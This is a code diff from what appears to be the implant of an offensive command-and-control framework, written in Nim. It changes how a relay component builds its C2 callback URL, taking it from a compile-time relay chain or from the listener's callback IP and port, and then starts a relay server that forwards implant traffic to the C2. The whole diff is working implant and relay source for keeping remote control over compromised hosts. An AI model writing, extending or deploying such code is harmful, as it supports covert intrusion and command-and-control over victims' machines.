@@ -1501,39 +1501,73 @@ proc httpHandler() {.async.} =
                             echo "[RELAY] 🚀 Starting HTTP relay server on runtime port: " & $port
                             echo "[RELAY] 🆔 Using implant GUID: " & listener.id
                         
-                        # Build C2 URL from listener config
-                        # Check if implantCallbackIp already has full URL (http:// or https://)
-                        var c2Url: string
-                        if listener.implantCallbackIp.startsWith("http://") or listener.implantCallbackIp.startsWith("https://"):
-                            # Use the full URL as-is (already has protocol)
-                            c2Url = listener.implantCallbackIp
-                            when defined debug:
-                                echo "[RELAY] 🌐 Using full URL from implantCallbackIp: " & c2Url
-                        else:
-                            # Build URL from components: listenerType + implantCallbackIp + listenerPort
-                            let protocol = toLowerAscii(listener.listenerType)
-                            let host = listener.implantCallbackIp
-                            let port = listener.listenerPort
-                            
-                            # Only add port if it's not the default for the protocol
-                            if (protocol == "http" and port != "80") or (protocol == "https" and port != "443"):
-                                c2Url = protocol & "://" & host & ":" & port
-                            else:
-                                c2Url = protocol & "://" & host
-                            
-                            when defined debug:
-                                echo "[RELAY] 🔧 Built C2 URL - Protocol: " & protocol & ", Host: " & host & ", Port: " & port
-                        
-                        when defined debug:
-                            echo "[RELAY] 🎯 C2 URL: " & c2Url
-                        
-                        # Get our own RELAY_CHAIN (parent chain) for forwarding
+                        # Build C2 URL from listener config or extract from RELAY_CHAIN
                         const RELAY_CHAIN {.strdefine.}: string = ""
+                        var c2Url: string
                         var parentChain = ""
+                        
+                        # If we have RELAY_CHAIN, extract C2 URL from the last hop
                         when RELAY_CHAIN != "":
                             parentChain = RELAY_CHAIN
                             when defined debug:
-                                echo "[RELAY] 🔗 Our parent chain: " & parentChain
+                                echo "[RELAY] 🔗 Extracting C2 from relay chain"
+                            
+                            # The last hop in RELAY_CHAIN is the C2
+                            # Clean and validate hops (trim whitespace, filter empties)
+                            var cleanHops: seq[string] = @[]
+                            for hop in parentChain.split(","):
+                                let trimmedHop = hop.strip()
+                                if trimmedHop.len > 0:
+                                    cleanHops.add(trimmedHop)
+                            
+                            if cleanHops.len > 0:
+                                let c2Hop = cleanHops[cleanHops.len - 1]
+                                
+                                # Check if hop already has protocol
+                                if c2Hop.startsWith("http://") or c2Hop.startsWith("https://"):
+                                    c2Url = c2Hop
+                                else:
+                                    # Use listener protocol if available, default to http
+                                    let protocol = if listener.listenerType != "": toLowerAscii(listener.listenerType) else: "http"
+                                    c2Url = protocol & "://" & c2Hop
+                                
+                                when defined debug:
+                                    echo "[RELAY] 🎯 C2 URL configured from chain"
+                            else:
+                                # Malformed RELAY_CHAIN, fall back to listener config
+                                c2Url = ""
+                                when defined debug:
+                                    echo "[RELAY] ⚠️  Malformed relay chain, falling back to listener config"
+                        
+                        # Fallback to listener config if no RELAY_CHAIN or extraction failed
+                        if c2Url == "":
+                            if listener.implantCallbackIp.startsWith("http://") or listener.implantCallbackIp.startsWith("https://"):
+                                # Use the full URL as-is (already has protocol)
+                                c2Url = listener.implantCallbackIp
+                                when defined debug:
+                                    echo "[RELAY] 🌐 Using full URL from listener"
+                            elif listener.implantCallbackIp != "":
+                                # Build URL from components: listenerType + implantCallbackIp + listenerPort
+                                let protocol = if listener.listenerType != "": toLowerAscii(listener.listenerType) else: "http"
+                                let host = listener.implantCallbackIp
+                                let port = listener.listenerPort
+                                
+                                # Only add port if it's not the default for the protocol
+                                if (protocol == "http" and port != "80") or (protocol == "https" and port != "443"):
+                                    c2Url = protocol & "://" & host & ":" & port
+                                else:
+                                    c2Url = protocol & "://" & host
+                                
+                                when defined debug:
+                                    echo "[RELAY] 🔧 Built C2 URL from listener components"
+                        
+                        when defined debug:
+                            if c2Url != "":
+                                echo "[RELAY] ✅ C2 URL configured successfully"
+                            else:
+                                echo "[RELAY] ❌ No C2 URL could be configured"
+                            if parentChain != "":
+                                echo "[RELAY] 🔗 Parent chain configured"
                         
                         # Start relay server in background (non-blocking)
                         let started = relay_launcher.startRelayServerWithPort(port, listener.id, parentChain, c2Url)
